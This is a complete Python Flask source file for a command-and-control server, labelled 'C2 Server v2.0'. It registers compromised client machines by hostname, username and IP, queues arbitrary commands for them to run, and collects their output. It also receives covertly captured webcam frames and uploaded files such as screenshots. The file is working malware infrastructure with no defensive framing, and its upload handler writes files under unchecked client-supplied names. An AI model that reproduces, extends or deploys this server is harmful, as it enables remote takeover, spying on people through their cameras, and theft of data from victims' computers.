#!/usr/bin/env python3
"""
C2 Server - Fixed Version
"""
from flask import Flask, request, jsonify, send_file
from flask_cors import CORS
import time
import uuid
import json
import sqlite3
import threading
import os
from datetime import datetime
import base64
import io

app = Flask(__name__)
CORS(app)

# In-memory storage (use database for production)
clients = {}
pending_commands = {}
command_results = {}
client_history = {}

def init_db():
    """Initialize SQLite database"""
    conn = sqlite3.connect('c2.db', check_same_thread=False)
    cursor = conn.cursor()
    
    # Create clients table
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS clients (
            id TEXT PRIMARY KEY,
            hostname TEXT,
            username TEXT,
            os TEXT,
            ip TEXT,
            last_seen REAL,
            status TEXT
        )
    ''')
    
    # Create commands table
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS commands (
            id TEXT PRIMARY KEY,
            client_id TEXT,
            command TEXT,
            status TEXT,
            output TEXT,
            created_at REAL,
            completed_at REAL,
            FOREIGN KEY (client_id) REFERENCES clients (id)
        )
    ''')
    
    conn.commit()
    conn.close()

def get_db():
    conn = sqlite3.connect('c2.db', check_same_thread=False)
    conn.row_factory = sqlite3.Row
    return conn

@app.route('/api/checkin', methods=['POST'])
def checkin():
    """Client check-in endpoint"""
    try:
        data = request.json
        if not data:
            return jsonify({'error': 'No data'}), 400
        
        client_id = data.get('id', 'unknown')
        
        # Store client info
        clients[client_id] = {
            'hostname': data.get('hostname', 'unknown'),
            'username': data.get('username', 'unknown'),
            'os': data.get('os', 'unknown'),
            'ip': request.remote_addr,
            'last_seen': time.time(),
            'status': 'online',
            'camera': data.get('camera', 0),
            'screen_size': data.get('screen_size', 'unknown')
        }
        
        # Update database
        conn = get_db()
        cursor = conn.cursor()
        cursor.execute('''
            INSERT OR REPLACE INTO clients (id, hostname, username, os, ip, last_seen, status)
            VALUES (?, ?, ?, ?, ?, ?, ?)
        ''', (client_id, 
              data.get('hostname'), 
              data.get('username'), 
              data.get('os'),
              request.remote_addr,
              time.time(),
              'online'))
        conn.commit()
        conn.close()
        
        print(f"[+] Checkin from {client_id} ({data.get('hostname')})")
        
        return jsonify({
            'status': 'ok',
            'message': 'Checkin successful',
            'timestamp': time.time()
        }), 200
        
    except Exception as e:
        print(f"[-] Checkin error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/command', methods=['POST'])
def send_command():
    """Send command to client"""
    try:
        data = request.json
        client_id = data.get('client_id')
        command = data.get('command')
        
        if not client_id or not command:
            return jsonify({'error': 'Missing client_id or command'}), 400
        
        # Generate command ID
        cmd_id = str(uuid.uuid4())
        
        # Store in memory
        pending_commands[cmd_id] = {
            'client_id': client_id,
            'command': command,
            'status': 'pending',
            'created_at': time.time(),
            'updated_at': time.time()
        }
        
        # Store in database
        conn = get_db()
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO commands (id, client_id, command, status, created_at)
            VALUES (?, ?, ?, ?, ?)
        ''', (cmd_id, client_id, command, 'pending', time.time()))
        conn.commit()
        conn.close()
        
        print(f"[+] Command sent: {cmd_id[:8]} to {client_id}: {command[:50]}")
        
        return jsonify({
            'success': True,
            'command_id': cmd_id,
            'message': 'Command queued',
            'timestamp': time.time()
        }), 200
        
    except Exception as e:
        print(f"[-] Command error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/commands/<client_id>', methods=['GET'])
def get_client_commands(client_id):
    """Get pending commands for a client"""
    try:
        # Get pending commands from database
        conn = get_db()
        cursor = conn.cursor()
        cursor.execute('''
            SELECT id, command FROM commands 
            WHERE client_id = ? AND status = 'pending'
            ORDER BY created_at ASC
        ''', (client_id,))
        
        commands = []
        for row in cursor.fetchall():
            commands.append({
                'id': row['id'],
                'command': row['command']
            })
        
        # Update status to 'sent'
        cursor.execute('''
            UPDATE commands SET status = 'sent' 
            WHERE client_id = ? AND status = 'pending'
        ''', (client_id,))
        
        conn.commit()
        conn.close()
        
        return jsonify({'commands': commands}), 200
        
    except Exception as e:
        print(f"[-] Get commands error: {e}")
        return jsonify({'commands': []}), 500

@app.route('/api/result', methods=['POST'])
def submit_result():
    """Client submits command result"""
    try:
        data = request.json
        cmd_id = data.get('command_id')
        output = data.get('output', '')
        
        if not cmd_id:
            return jsonify({'error': 'Missing command_id'}), 400
        
        # Update database
        conn = get_db()
        cursor = conn.cursor()
        cursor.execute('''
            UPDATE commands 
            SET status = 'completed', output = ?, completed_at = ?
            WHERE id = ?
        ''', (output, time.time(), cmd_id))
        
        conn.commit()
        conn.close()
        
        print(f"[+] Result received for {cmd_id[:8]}: {len(output)} chars")
        
        return jsonify({'success': True}), 200
        
    except Exception as e:
        print(f"[-] Result error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/command/result/<cmd_id>', methods=['GET'])
def get_command_result(cmd_id):
    """Get result for specific command"""
    try:
        conn = get_db()
        cursor = conn.cursor()
        cursor.execute('''
            SELECT * FROM commands WHERE id = ?
        ''', (cmd_id,))
        
        row = cursor.fetchone()
        conn.close()
        
        if row:
            return jsonify({
                'success': True,
                'command_id': row['id'],
                'status': row['status'],
                'output': row['output'] or '',
                'created_at': row['created_at'],
                'completed_at': row['completed_at']
            }), 200
        else:
            return jsonify({
                'success': False,
                'error': 'Command not found',
                'status': 'unknown'
            }), 404
            
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/clients', methods=['GET'])
def get_clients():
    """Get list of all clients"""
    try:
        conn = get_db()
        cursor = conn.cursor()
        cursor.execute('SELECT * FROM clients ORDER BY last_seen DESC')
        
        client_list = []
        now = time.time()
        
        for row in cursor.fetchall():
            # Update status based on last_seen
            status = 'online' if (now - row['last_seen']) < 60 else 'offline'
            
            client_list.append({
                'id': row['id'],
                'hostname': row['hostname'],
                'username': row['username'],
                'os': row['os'],
                'ip': row['ip'],
                'status': status,
                'last_seen': row['last_seen'],
                'last_seen_str': time.ctime(row['last_seen'])
            })
        
        conn.close()
        
        return jsonify({'clients': client_list}), 200
        
    except Exception as e:
        print(f"[-] Get clients error: {e}")
        return jsonify({'clients': []}), 500

@app.route('/api/client/<client_id>', methods=['GET'])
def get_client(client_id):
    """Get specific client details"""
    try:
        conn = get_db()
        cursor = conn.cursor()
        
        # Get client info
        cursor.execute('SELECT * FROM clients WHERE id = ?', (client_id,))
        client = cursor.fetchone()
        
        if not client:
            conn.close()
            return jsonify({'error': 'Client not found'}), 404
        
        # Get command history
        cursor.execute('''
            SELECT * FROM commands 
            WHERE client_id = ? 
            ORDER BY created_at DESC 
            LIMIT 50
        ''', (client_id,))
        
        commands = []
        for row in cursor.fetchall():
            commands.append(dict(row))
        
        conn.close()
        
        return jsonify({
            'client': dict(client),
            'commands': commands
        }), 200
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/stats', methods=['GET'])
def get_stats():
    """Get server statistics"""
    try:
        conn = get_db()
        cursor = conn.cursor()
        
        # Count clients
        cursor.execute("SELECT COUNT(*) as count FROM clients")
        total_clients = cursor.fetchone()['count']
        
        # Count online clients (last seen within 60 seconds)
        cursor.execute("SELECT COUNT(*) as count FROM clients WHERE last_seen > ?", 
                      (time.time() - 60,))
        online_clients = cursor.fetchone()['count']
        
        # Count commands
        cursor.execute("SELECT COUNT(*) as count FROM commands")
        total_commands = cursor.fetchone()['count']
        
        # Count pending commands
        cursor.execute("SELECT COUNT(*) as count FROM commands WHERE status = 'pending'")
        pending_commands = cursor.fetchone()['count']
        
        conn.close()
        
        return jsonify({
            'total_clients': total_clients,
            'online_clients': online_clients,
            'total_commands': total_commands,
            'pending_commands': pending_commands,
            'server_time': time.time(),
            'server_uptime': time.time() - app_start_time
        }), 200
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/camera/frame', methods=['POST'])
def receive_camera_frame():
    """Receive camera frame from client"""
    try:
        data = request.form
        client_id = data.get('client_id')
        frame_data = data.get('frame')
        
        if client_id and frame_data:
            # Save frame to file
            filename = f"frames/{client_id}_{int(time.time())}.jpg"
            os.makedirs('frames', exist_ok=True)
            
            with open(filename, 'wb') as f:
                f.write(base64.b64decode(frame_data))
            
            print(f"[+] Camera frame saved: {filename}")
            return jsonify({'success': True}), 200
        
        return jsonify({'error': 'Missing data'}), 400
        
    except Exception as e:
        print(f"[-] Camera error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/upload', methods=['POST'])
def upload_file():
    """Handle file uploads (screenshots, etc.)"""
    try:
        if 'file' not in request.files:
            return jsonify({'error': 'No file'}), 400
        
        file = request.files['file']
        client_id = request.form.get('client_id')
        filename = request.form.get('filename', f'upload_{int(time.time())}')
        
        if file and client_id:
            # Save file
            upload_dir = 'uploads'
            os.makedirs(upload_dir, exist_ok=True)
            
            filepath = os.path.join(upload_dir, filename)
            file.save(filepath)
            
            print(f"[+] File uploaded: {filepath} from {client_id}")
            return jsonify({'success': True, 'filename': filename}), 200
        
        return jsonify({'error': 'Invalid upload'}), 400
        
    except Exception as e:
        print(f"[-] Upload error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/health', methods=['GET'])
def health():
    """Health check endpoint"""
    return jsonify({
        'status': 'healthy',
        'timestamp': time.time(),
        'clients_count': len(clients)
    }), 200

@app.route('/')
def index():
    """Server homepage"""
    return '''
    <h1>C2 Server Running</h1>
    <p>Server is operational</p>
    <ul>
        <li><a href="/api/clients">Clients</a></li>
        <li><a href="/api/stats">Stats</a></li>
        <li><a href="/api/health">Health</a></li>
    </ul>
    '''

def cleanup_old_clients():
    """Clean up old client entries"""
    while True:
        time.sleep(300)  # Run every 5 minutes
        try:
            conn = get_db()
            cursor = conn.cursor()
            # Delete clients not seen for 24 hours
            cursor.execute("DELETE FROM clients WHERE last_seen < ?", 
                          (time.time() - 86400,))
            # Delete old commands (7 days)
            cursor.execute("DELETE FROM commands WHERE created_at < ?", 
                          (time.time() - 604800,))
            conn.commit()
            conn.close()
            print(f"[+] Cleanup completed at {time.ctime()}")
        except Exception as e:
            print(f"[-] Cleanup error: {e}")

if __name__ == '__main__':
    # Initialize database
    init_db()
    
    # Create directories
    os.makedirs('frames', exist_ok=True)
    os.makedirs('uploads', exist_ok=True)
    
    # Start cleanup thread
    cleanup_thread = threading.Thread(target=cleanup_old_clients, daemon=True)
    cleanup_thread.start()
    
    app_start_time = time.time()
    
    print(f"""
╔══════════════════════════════════════════════════════════╗
║                    C2 SERVER v2.0                        ║
║                    Starting up...                        ║
╚══════════════════════════════════════════════════════════╝
    
    Database: c2.db
    Frames: ./frames/
    Uploads: ./uploads/
    
    Endpoints:
    • POST /api/checkin          - Client checkin
    • POST /api/command          - Send command
    • GET  /api/commands/<id>    - Get pending commands
    • POST /api/result           - Submit result
    • GET  /api/clients          - List clients
    • GET  /api/stats            - Server stats
    
    Starting server on http://0.0.0.0:5000
    """)
    
    app.run(host='0.0.0.0', port=5000, debug=True, threaded=True)
